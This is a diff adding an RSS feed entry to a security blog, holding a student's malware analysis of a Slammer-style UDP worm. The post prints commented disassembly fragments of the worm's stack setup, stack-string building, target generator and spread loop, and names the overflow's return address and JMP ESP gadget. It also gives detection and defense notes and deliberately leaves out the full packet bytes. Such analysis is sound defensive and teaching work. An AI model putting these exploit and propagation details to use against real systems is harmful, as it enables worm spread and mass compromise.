@@ -2,6 +2,110 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel>
   <title>0xDay</title><link>https://nrodrigue2004.github.io/0xday/</link><description>Notes on cybersecurity, computer science and tech by Nathan Rodrigue.</description><language>en</language>
   <atom:link href="https://nrodrigue2004.github.io/0xday/feed.xml" rel="self" type="application/rss+xml"/>
+  <item><title>Tearing Down a SQL Slammer-Style Worm: 376 Bytes of UDP</title><link>https://nrodrigue2004.github.io/0xday/posts/slammer-worm-teardown.html</link><guid>https://nrodrigue2004.github.io/0xday/posts/slammer-worm-teardown.html</guid><pubDate>Sat, 07 Nov 2026 12:00:00 +0000</pubDate><category>malware</category><category>reverse-engineering</category><category>assembly</category><description>&lt;p&gt;The companion to my &lt;a href=&quot;wg2-rat-teardown.html&quot;&gt;wg2 RAT teardown&lt;/a&gt; is a 2003-era worm: an SQL Slammer / Sapphire style sample. For my reverse engineering course I produced a fully commented disassembly plus a stack-layout diagram, and this post is the condensed version.&lt;/p&gt;
+&lt;p&gt;It&#x27;s a nice contrast with wg2. wg2 is a big C++ program with a command loop. Slammer is &lt;strong&gt;376 bytes&lt;/strong&gt; with no C2, no persistence and no commands. It does one thing, forever.&lt;/p&gt;
+
+&lt;h2&gt;What it does, in one breath&lt;/h2&gt;
+&lt;p&gt;A single UDP packet to SQL Server&#x27;s resolution service (UDP 1434) overflows a stack buffer, redirects the return address to a &lt;code&gt;JMP ESP&lt;/code&gt; gadget in &lt;code&gt;sqlsort.dll&lt;/code&gt;, and lands in the worm body. The worm then resolves the few APIs it needs, opens a UDP socket, and sprays copies of itself at pseudo-random IPv4 addresses until the machine is turned off.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;overflow 1434/udp -&amp;gt; RET to JMP ESP -&amp;gt; shellcode on stack
+  -&amp;gt; build API names on the stack -&amp;gt; LoadLibraryA / GetProcAddress
+  -&amp;gt; GetTickCount (seed) -&amp;gt; socket(UDP) -&amp;gt; sendto() in an endless loop&lt;/code&gt;&lt;/pre&gt;
+&lt;p class=&quot;muted&quot;&gt;I&#x27;m describing behavior and structure for defenders and students. I left out the full packet bytes on purpose.&lt;/p&gt;
+
+&lt;h2&gt;Getting control&lt;/h2&gt;
+&lt;p&gt;The first byte of the packet selects the vulnerable code path in the SQL Server parser. A long run of &lt;code&gt;0x01&lt;/code&gt; filler overruns the buffer, and the saved return address is replaced with &lt;code&gt;0x42B0C9DC&lt;/code&gt;, a &lt;code&gt;JMP ESP&lt;/code&gt; inside &lt;code&gt;sqlsort.dll&lt;/code&gt;. When the function returns, execution lands on ESP, which points at the worm. A short &lt;code&gt;jmp&lt;/code&gt; hops over embedded data into a NOP sled.&lt;/p&gt;
+&lt;p&gt;The worm doesn&#x27;t get &quot;called&quot;. It&#x27;s reached by corrupting a return, which is why the stack matters so much for this sample.&lt;/p&gt;
+
+&lt;h2&gt;The stack is the data section&lt;/h2&gt;
+&lt;p&gt;There&#x27;s no data segment and no import table. First the worm carves out workspace by pushing &lt;code&gt;0x01010101&lt;/code&gt; 24 times (96 bytes) and sets &lt;code&gt;EBP = ESP&lt;/code&gt;. Everything after that is an EBP-relative local variable. The filler value is chosen so the payload has no null bytes, which would truncate the overflow, and the worm even builds &lt;code&gt;0x04000000&lt;/code&gt; with an XOR instead of writing the zeros.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;mov  eax, 01010101h
+xor  ecx, ecx
+mov  cl, 18h          ; 24 iterations
+L: push eax
+   loop L             ; 96 bytes of workspace
+xor  eax, 05010101h   ; -&amp;gt; 04000000h with no null bytes in the code
+push eax
+mov  ebp, esp&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3&gt;Stack layout&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;EBP-0x54  UDP socket handle
+EBP-0x50  sockaddr_in (random IP + port 1434)
+EBP-0x4C  PRNG seed / state  (starts from GetTickCount)
+EBP-0x48..0x40  saved handles: kernel32, GetTickCount name ptr, ws2_32
+EBP-0x3C  &quot;sendto&quot;
+EBP-0x34  &quot;socket&quot;
+EBP-0x2C  &quot;kernel32.dll&quot;
+EBP-0x20  &quot;GetTickCount&quot;
+EBP-0x10  &quot;ws2_32.dll&quot;&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2&gt;Strings built backwards&lt;/h2&gt;
+&lt;p&gt;API names are pushed as little-endian dwords, last chunk first, so they read correctly in memory. Short endings use a 16-bit &lt;code&gt;mov cx&lt;/code&gt; so the upper bytes stay zero and the string is null-terminated for free.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;push ecx              ; NUL
+push 6C6C642Eh        ; &quot;.dll&quot;
+push 32336C65h        ; &quot;el32&quot;
+push 6E72656Bh        ; &quot;kern&quot;  -&amp;gt; kernel32.dll&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;That&#x27;s the main tell when you&#x27;re analyzing it: a long run of &lt;code&gt;push imm32&lt;/code&gt; with printable ASCII constants means stack strings, and tools like &lt;code&gt;strings&lt;/code&gt; will never see them.&lt;/p&gt;
+
+&lt;h2&gt;Finding its APIs&lt;/h2&gt;
+&lt;p&gt;With no imports, the worm borrows &lt;code&gt;sqlsort.dll&lt;/code&gt;&#x27;s own import table. It calls &lt;code&gt;LoadLibraryA&lt;/code&gt; through a known IAT slot for &lt;code&gt;kernel32.dll&lt;/code&gt; and &lt;code&gt;ws2_32.dll&lt;/code&gt;, then calls &lt;code&gt;GetProcAddress&lt;/code&gt; through another slot. Because that slot differs between builds, it checks that the target starts with the expected prologue bytes (&lt;code&gt;55 8B EC 51&lt;/code&gt;) and falls back to a second address if not.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;esi = [IAT: LoadLibraryA]     ; call [esi]
+esi = [IAT: GetProcAddress?]  ; check first dword == 51EC8B55h
+                              ; no match -&amp;gt; use the backup slot&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;It resolves &lt;code&gt;GetTickCount&lt;/code&gt; and calls it. The return value isn&#x27;t for timing, it&#x27;s the seed for the target generator. Then it resolves &lt;code&gt;socket&lt;/code&gt;, creates a UDP socket (&lt;code&gt;AF_INET&lt;/code&gt;, &lt;code&gt;SOCK_DGRAM&lt;/code&gt;, protocol 17) and resolves &lt;code&gt;sendto&lt;/code&gt;, keeping the function pointer in &lt;code&gt;ESI&lt;/code&gt; for the rest of its life.&lt;/p&gt;
+
+&lt;h2&gt;Picking victims without a multiply&lt;/h2&gt;
+&lt;p&gt;The target generator is a linear congruential generator, &lt;code&gt;seed = seed * 214013 + increment&lt;/code&gt;. Instead of &lt;code&gt;imul&lt;/code&gt;, the worm builds the multiplier from &lt;code&gt;lea&lt;/code&gt;, shifts, an add and a sub, which keeps the encoding tiny and free of null bytes:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;lea  ecx, [eax+eax*2]   ; 3x
+lea  edx, [eax+ecx*4]   ; 13x
+shl  edx, 4             ; 208x
+add  edx, eax           ; 209x
+shl  edx, 8             ; 53504x
+sub  edx, eax           ; 53503x
+lea  eax, [eax+edx*4]   ; 214013x   (0x343FD)
+add  eax, ebx           ; + increment
+mov  [ebp-4Ch], eax     ; new state, also the next target IP&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I like this part because the whole generator is eight instructions and you can verify the constant by hand. The new state is stored back at &lt;code&gt;EBP-0x4C&lt;/code&gt; and doubles as the destination address.&lt;/p&gt;
+
+&lt;h2&gt;The spread loop&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;push 10h                 ; tolen = sizeof(sockaddr_in)
+lea  eax, [ebp-50h]      ; to
+push eax
+xor  ecx, ecx
+push ecx                 ; flags = 0
+xor  cx, 0178h           ; len = 376
+push ecx
+lea  eax, [ebp+3]        ; buf = start of worm body
+push eax
+mov  eax, [ebp-54h]      ; socket
+push eax
+call esi                 ; sendto(s, buf, 376, 0, &amp;amp;to, 16)
+jmp  short PRNG          ; never returns&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Single datagram, no handshake, no reply expected. That&#x27;s why it spread so fast: with UDP there&#x27;s nothing to wait on, so the only limit is how quickly &lt;code&gt;sendto&lt;/code&gt; can be called and how fast the uplink is.&lt;/p&gt;
+
+&lt;h2&gt;wg2 vs. Slammer&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;                wg2 (RAT)               Slammer-style worm
+language        C++                     hand-written asm shellcode
+size            full PE32               376 bytes
+transport       HTTP/HTTPS (TCP)        one UDP datagram
+control         C2 loop, 11 commands    none
+persistence     beacon loop             none (memory only)
+goal            remote administration   replicate&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2&gt;Detection and defense notes&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Network:&lt;/strong&gt; a host sending a flood of identical ~376-byte UDP packets to port 1434 across wide address ranges is the whole signature. Flow-based detection (fan-out rate to one port) works even if the payload changes.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Exposure:&lt;/strong&gt; the resolution service shouldn&#x27;t be reachable from untrusted networks. Filtering 1434/udp at the edge stops this outright.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Memory-only:&lt;/strong&gt; nothing touches disk, so file-based AV has nothing to scan. Patching the SQL Server flaw is the real fix.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Analysis tip:&lt;/strong&gt; when a sample has no imports and a wall of &lt;code&gt;push imm32&lt;/code&gt; ASCII, decode the stack strings first. The rest of the logic falls out of those names.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2&gt;What I took away&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Drawing the stack diagram first made the disassembly readable. Without it, every &lt;code&gt;[ebp-xx]&lt;/code&gt; is a mystery.&lt;/li&gt;
+&lt;li&gt;Tiny does not mean simple. Null-byte avoidance shaped almost every instruction choice.&lt;/li&gt;
+&lt;li&gt;Comparing it with wg2 clarified how different &quot;malware&quot; can be: one waits for orders, the other never stops to listen.&lt;/li&gt;
+&lt;/ul&gt;
+</description></item>
   <item><title>Tearing Down wg2: An HTTP RAT in Ghidra</title><link>https://nrodrigue2004.github.io/0xday/posts/wg2-rat-teardown.html</link><guid>https://nrodrigue2004.github.io/0xday/posts/wg2-rat-teardown.html</guid><pubDate>Sat, 07 Nov 2026 12:00:00 +0000</pubDate><category>malware</category><category>reverse-engineering</category><category>ghidra</category><description>&lt;p&gt;For my reverse engineering course I took apart &lt;strong&gt;wg2&lt;/strong&gt;, a 32-bit Windows RAT, function by function in Ghidra. This is the condensed version of my annotated decompilation: how it hides its C2, how it talks home, and the eleven commands it gives an attacker.&lt;/p&gt;
 &lt;p class=&quot;muted&quot;&gt;Ghidra&#x27;s FUN_ names are kept so you can follow along in your own copy. The C2 domain is defanged.&lt;/p&gt;
 
